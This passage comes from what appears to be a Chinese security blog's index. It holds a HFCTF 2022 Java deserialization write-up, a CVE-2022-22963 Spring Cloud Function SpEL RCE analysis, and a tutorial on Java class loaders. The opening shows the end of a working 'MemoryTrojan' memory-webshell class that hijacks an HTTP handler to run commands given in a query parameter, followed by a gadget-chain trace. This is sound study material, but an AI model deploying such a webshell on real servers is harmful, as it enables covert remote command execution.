&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        response+=(<span class="string">&quot;\n&quot;</span>+<span class="keyword">new</span> <span class="title class_">String</span>(output.toByteArray()));</span><br><span class="line">        t.sendResponseHeaders(<span class="number">200</span>, (<span class="type">long</span>)response.length());</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> t.getResponseBody();</span><br><span class="line">        os.write(response.getBytes());</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MemoryTrojan</span><span class="params">()</span> <span class="keyword">throws</span> Exception  &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;group&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = obj.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line">            Thread[] threads = (Thread[]) obj;</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;Thread-2&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        field = thread.getClass().getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        obj = field.get(thread);</span><br><span class="line">                        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">&quot;contexts&quot;</span>);</span><br><span class="line">                        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">                        field = obj.getClass().getDeclaredField(<span class="string">&quot;list&quot;</span>);</span><br><span class="line">                        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        obj = field.get(obj);</span><br><span class="line">                        java.util.<span class="type">LinkedList</span> <span class="variable">lt</span> <span class="operator">=</span> (java.util.LinkedList)obj;</span><br><span class="line">                        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> lt.get(<span class="number">0</span>);</span><br><span class="line">                        field = o.getClass().getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        field.set(o,<span class="built_in">this</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将payload解码上传，之后访问主页<code>?y4tacker=cmd</code>即可执行内存马RCE</p>
+<img src="/2022/05/27/CTF/hfctf2022-ezchain/5.png" class="">
+<h2 id="POP链">POP链</h2>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getObject:<span class="number">179</span>, SignedObject (java.security)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">158</span>, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:<span class="number">129</span>, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:<span class="number">125</span>, ObjectBean (com.rometools.rome.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">198</span>, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode:<span class="number">113</span>, ObjectBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash:<span class="number">339</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">612</span>, HashMap (java.util)</span><br><span class="line">readMap:<span class="number">114</span>, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">538</span>, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2110</span>, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">handle:<span class="number">44</span>, IndexBase64$MyHandler</span><br><span class="line">doFilter:<span class="number">79</span>, Filter$Chain (com.sun.net.httpserver)</span><br><span class="line">doFilter:<span class="number">83</span>, AuthFilter (sun.net.httpserver)</span><br><span class="line">doFilter:<span class="number">82</span>, Filter$Chain (com.sun.net.httpserver)</span><br><span class="line">handle:<span class="number">675</span>, ServerImpl$Exchange$LinkHandler (sun.net.httpserver)</span><br><span class="line">doFilter:<span class="number">79</span>, Filter$Chain (com.sun.net.httpserver)</span><br><span class="line">run:<span class="number">647</span>, ServerImpl$Exchange (sun.net.httpserver)</span><br><span class="line">runWorker:<span class="number">1149</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+<h2 id="完-3">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Java反序列化</tag>
+        <tag>二次反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-22963: Spring Cloud Function SPEL RCE</title>
+    <url>/2022/05/30/Springboot/CVE-2022-22963/</url>
+    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
+<p>向<code>/functionRouter</code>路由发送headers带有<code>spring.cloud.function.routing-expression</code>键的POST包时，会触发SPEL解析该键值</p>
+<h2 id="影响范围">影响范围</h2>
+<p>3.0.0 &lt;= Spring Cloud Function &lt;= 3.2.2</p>
+<span id="more"></span>
+<h2 id="漏洞复现">漏洞复现</h2>
+<blockquote>
+<p>官方已提供参考PoC</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/1.png" class="">
+</blockquote>
+<p>新建Spring Cloud Function项目</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/2.png" class="">
+<p>修改pom为受影响版本</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/3.png" class="">
+<p>启动默认Application即可，然后向/functionRouter路由发送恶意包即可</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/4.png" class="">
+<h2 id="代码审计-3">代码审计</h2>
+<p>从POST请求传入开始，在org.springframework.cloud.function.web.mvc.FunctionController</p>
+<p>Content-Type是x-www-form-urlencoded，因此在form方法设置断点</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/5.png" class="">
+<p>进入processRequest处理请求</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/6.png" class="">
+<p>processRequest方法获取了post请求的headers和正文，整合成Message对象传入doApply方法</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/7.png" class="">
+<p>判断请求如果是RoutingFunction则调用RoutingFunction.apply方法</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/8.png" class="">
+<p>最后来到RoutingFunction.route方法，默认function是null，获取headers<code>spring.cloud.function.routing-expression</code>的值，传入functionFromExpression方法</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/9.png" class="">
+<p>首先获取了SPEL表达式，也就是headers<code>spring.cloud.function.routing-expression</code>的值，然后传入getValue方法</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/10.png" class="">
+<p>然后抽象语法树ast解析SPEL表达式</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/11.png" class="">
+<p>最后在ReflectiveMethodExecutor.class调用反射完成RCE</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/12.png" class="">
+<h2 id="POP链-2">POP链</h2>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/13.png" class="">
+<h2 id="补丁修复分析">补丁修复分析</h2>
+<p>漏洞在于未对headers的内容进行检测，完全信任headers</p>
+<p>在V3.2.3中：functionFromExpress内部调用getValve方法解析SPEL时，使用的是headerEvalContext而不是evalContext</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/14.png" class="">
+<p>新增加的SimpleEvaluationContext</p>
+<img src="/2022/05/30/Springboot/CVE-2022-22963/15.png" class="">
+<p>SimpleEvaluationContext类相比StandardEvaluationContext类，确保了仅提供安全的操作</p>
+<h2 id="自动检测脚本">自动检测脚本</h2>
+<blockquote>
+<p><a href="https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE">https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE</a></p>
+</blockquote>
+<h2 id="参考-2">参考</h2>
+<blockquote>
+<p><a href="https://tanzu.vmware.com/security/cve-2022-22963">https://tanzu.vmware.com/security/cve-2022-22963</a></p>
+<p><a href="https://github.com/spring-cloud/spring-cloud-function/compare/v3.2.2...v3.2.3#diff-01d5affef57305a3034bfb48185f34ae3d21f15e7f389851ac67035f7bd0dc7a">https://github.com/spring-cloud/spring-cloud-function/compare/v3.2.2...v3.2.3#diff-01d5affef57305a3034bfb48185f34ae3d21f15e7f389851ac67035f7bd0dc7a</a></p>
+<p><a href="https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f">https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f</a></p>
+</blockquote>
+<h2 id="完-4">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Springboot</category>
+      </categories>
+      <tags>
+        <tag>Java安全</tag>
+        <tag>springboot</tag>
+        <tag>spel注入</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅析类加载器及双亲委派机制</title>
+    <url>/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/</url>
+    <content><![CDATA[<h2 id="类加载器基础">类加载器基础</h2>
+<p>一切Java类都必须经过JVM加载才能运行，加载类的类就是类加载器（ClassLoader），它负责将class字节码转换成内存的class类。<strong>JVM 运行并不是一次性加载全部类，是按需加载，当用到未知类时才进行加载。</strong></p>
+<h2 id="Java自带的三个类加载器">Java自带的三个类加载器</h2>
+<p>Java自带三个类加载器：</p>
+<ol>
+<li class="lvl-5">
+<p>BootstrapClassLoader：引导类加载器（<strong>根加载器</strong>）</p>
+</li>
+<li class="lvl-5">
+<p>ExtensionClassLoader：扩展类加载器</p>
+</li>
+<li class="lvl-5">
+<p>AppClassLoader：系统类加载器（<strong>默认</strong>）</p>
+</li>
+</ol>
+<p><strong>类加载器的定义声明在<code>%JAVA_HOME%/lib/rt.jar/sun/Launch.class</code>，它是JVM的入口。</strong></p>
+<h3 id="BootstrapClassLoader">BootstrapClassLoader</h3>
+<p>BootstrapClassLoader 负责加载 JVM 运行时核心类，它负责索引环境变量<code>%JAVA_HOME%/lib</code>下的所有核心类jar包和class文件，最常见的就是<code>rt.jar</code>。<strong>Bootstrap ClassLoader是由C/C++编写的，是JVM的一部分，并不是一个Java类。也被称为根加载器。</strong></p>
+<p>由于是C/C++定义的因此没有其Java类，在Launch.class定义了根加载器的索引路径<code>sun.boot.class.path</code></p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/1.png" class="">获取并输出：
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(System.getProperty(<span class="string">&quot;sun.boot.class.path&quot;</span>));</span><br></pre></td></tr></table></figure>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/2.png" class="">
+<h3 id="ExtensionClassLoader">ExtensionClassLoader</h3>
+<p>ExtensionClassLoader负责加载扩展类，索引环境变量<code>%JAVA_HOME%/lib/ext</code>下的所有扩展类jar包和class文件，这些扩展包通常以<code>javax</code>开头。<strong>为了方便简写为ExtClassLoader。</strong></p>
+<p><code>Launch.class</code>下面定义了它</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/3.png" class="">
+<p>内部通过<code>java.ext.dirs</code>定义了索引路径</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/4.png" class="">
+<p>输出：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(System.getProperty(<span class="string">&quot;java.ext.dirs&quot;</span>));</span><br></pre></td></tr></table></figure>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/5.png" class="">
+<h3 id="AppClassLoader">AppClassLoader</h3>
+<p>AppClassLoader负责索引环境变量<code>%CLASSPATH%</code>下的 jar 包和class文件。<strong>我们自己通常都是由它来加载，此外如果不声明类加载器，它是默认的类加载器。</strong></p>
+<p><code>Launch.class</code>同样也定义了索引路径：</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/6.png" class="">
+<p>可以看到本项目的out目录</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(System.getProperty(<span class="string">&quot;java.class.path&quot;</span>));</span><br></pre></td></tr></table></figure>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/7.png" class="">
+<h2 id="类加载器顺序">类加载器顺序</h2>
+<p>从运行开始，类加载器按照以下顺序加载类</p>
+<ol>
+<li class="lvl-5">
+<p>BootstrapClassLoader</p>
+</li>
+<li class="lvl-5">
+<p>ExtClassLoader</p>
+</li>
+<li class="lvl-5">
+<p>AppClassLoader</p>
+</li>
+</ol>
+<h3 id="按需加载">按需加载</h3>
+<p><strong>程序在运行中由于是按需加载，加载到未知类时，由调用它的类的类加载器加载。也就是说：在我们编写的Java文件public class下的新类都是由AppClassLoader加载。</strong></p>
+<h2 id="获取类加载器">获取类加载器</h2>
+<p>每个对象里面都有一个classLoader属性记录了当前的类是由谁来加载的。使用静态方法<code>Class.class.getClassLoader()</code>可以获取某类的类加载器。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Main.class.getClassLoader();</span><br></pre></td></tr></table></figure>
+<p>可以看到我们编写的Java确实是由AppClassLoader加载的</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/8.png" class="">
+<h3 id="BootstrapClassLoader为空">BootstrapClassLoader为空</h3>
+<p>打印String类的类加载器：</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/9.png" class="">
+<p>抛出空指针异常，这是由于String等基础类是由根加载器加载的，<strong>如果加载器为空则表示由根加载器加载。</strong></p>
+<h2 id="父加载器不是加载器的父类">父加载器不是加载器的父类</h2>
+<h3 id="加载器的父类">加载器的父类</h3>
+<p>在Launch.class看到：AppClassLoader和ExtClassLoader都继承自URLClassLoader</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/10.png" class="">
+<p><strong>Java定义了URLClassLoader可以加载远程和本地的类，由于Ext和App只需要加载本地的，因此它们都是URLClassLoader的子类。这里是代码实现上的父子关系</strong></p>
+<p>同样URLClassLoader继承SecureClassLoader，SecureClassLoader最终继承自ClassLoader，以下是类加载器的继承关系：</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/11.png" class="">
+<p>另外：我们可以使用URLClassLoader加载远程的jar来实现远程的类方法调用以验证漏洞。</p>
+<h3 id="父加载器">父加载器</h3>
+<p><strong>每个加载器都有一个父加载器</strong>，使用方法<code>ClassLoader.getParent()</code>获取父加载器</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/12.png" class="">
+<p>可以发现：AppClassLoader的父加载器是ExtClassLoader，然后父加载器是Null（根加载器）,以下是类加载器的功能关系：</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/13.png" class="">
+<p><strong>在Launch.class中定义了App的父加载器是Ext</strong></p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/14.png" class="">
+<h4 id="BootstrapClassLoader为空的原因">BootstrapClassLoader为空的原因</h4>
+<p>Ext的父加载器并没有显式的定义，Ext的声明也是隐式的：</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/15.png" class="">
+<p>然后调用父类URLClassLoader的构造方法，注意第二个传参是Null</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/16.png" class="">
+<p>URLClassLoader又将这个空的parent继续super向上传递</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/17.png" class="">**然后一直到ClassLoader的构造方法，调用`this.parent=parent`，因此是Ext的父加载器是Null**
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/18.png" class="">
+<h2 id="类加载流程">类加载流程</h2>
+<p><code>ClassLoader.class</code>规定了类加载的流程，入口在<code>public Class&lt;?&gt; loadClass(String name)</code></p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/19.png" class="">
+<ol>
+<li class="lvl-5">
+<p>首先检测该类是否被加载，如果被加载直接返回该类</p>
+</li>
+<li class="lvl-5">
+<p>如果未被加载，检测是否声明了父加载器，如果声明类父加载器则使用父加载器加载它</p>
+</li>
+<li class="lvl-5">
+<p>如果未被加载，也未声明父加载器，再次尝试用根加载器加载它</p>
+</li>
+<li class="lvl-5">
+<p>如果根加载器也无法加载，再使用该加载器自身加载</p>
+</li>
+</ol>
+<h3 id="双亲委派">双亲委派</h3>
+<p>根据以上步骤，首先委托会依照App-Ext-Boot向上传递，逐级检查是否被加载；如果未被加载再依照Boot-Ext-App向下查找，直至找到或抛出错误。</p>
+<p>以上方法被称为双亲委派，三个 ClassLoader之间形成了级联的父子关系，每个 ClassLoader都很懒，尽量把工作交给父加载器做，父加载器干不了了自己才会干，最后会递归到根加载器。</p>
+<h4 id="优点">优点</h4>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p>避免类的重复加载， 确保一个类的全局唯一性</p>
+</li>
+<li class="lvl-3">
+<p>保护程序安全， 防止核心 API 被随意篡改</p>
+</li>
+</ul>
+<h4 id="缺点">缺点</h4>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p>父加载器无法访问子加载器所加载的类</p>
+</li>
+</ul>
+<h2 id="自定义类加载器">自定义类加载器</h2>
+<p>因为自带的类加载器只能从指定的环境变量加载，而非环境变量路径的加载就需要自定义类加载器来实现。</p>
+<h3 id="自定义类加载器的条件">自定义类加载器的条件</h3>
+<p>编写自定义类加载器需要继承ClassLoader类，需要涉及以下两个重要的方法：</p>
+<ol>
+<li class="lvl-5">
+<p><code>findClass()</code>，<strong>自定义加载器自己的加载方法，如果父加载器都无法加载时调用，需要重写</strong>，该方法的目的是获取class字节码</p>
+</li>
+<li class="lvl-5">
+<p><code>defineClass()</code>，在<code>findClass()</code>内调用，用于组装class对象</p>
+</li>
+</ol>
+<p>另外，自定义类加载器不要轻易覆盖<code>loadClass()</code>方法，否则可能会导致自定义加载器无法加载核心类库。在使用自定义加载器时，要明确好它的父加载器是谁，将父加载器通过子类的构造器传入，如果缺省，父加载器是App。</p>
+<h3 id="自定义类加载器示例">自定义类加载器示例</h3>
+<h4 id="HelloWorld-class">HelloWorld.class</h4>
+<p>编写一个HelloWorld.java，编译为class文件等待导入</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HelloWorld.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac HelloWorld.class</span><br></pre></td></tr></table></figure>
+<p>然后将它移动到其他目录下，作为一个临时lib，这里我选择的是./resource</p>
+<img src="/2022/06/20/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%B5%85%E6%9E%90%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8F%8A%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6/20.png" class="">
+<h4 id="CustomizedHelloWorldClassLoader-java">CustomizedHelloWorldClassLoader.java</h4>
+<p>写一个最简单的自定义类加载器</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// CustomizedHelloWorldClassLoader.java</span></span><br><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomizedHelloWorldClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">	<span class="comment">// 重写方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 待读取的class文件名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;HelloWorld.class&quot;</span>;</span><br><span class="line">		<span class="comment">// 存放class的路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">customizedPath</span> <span class="operator">=</span> <span class="string">&quot;./resource&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(customizedPath, fileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	<span class="comment">// 按字节读入class文件</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">int</span> length;</span><br><span class="line">            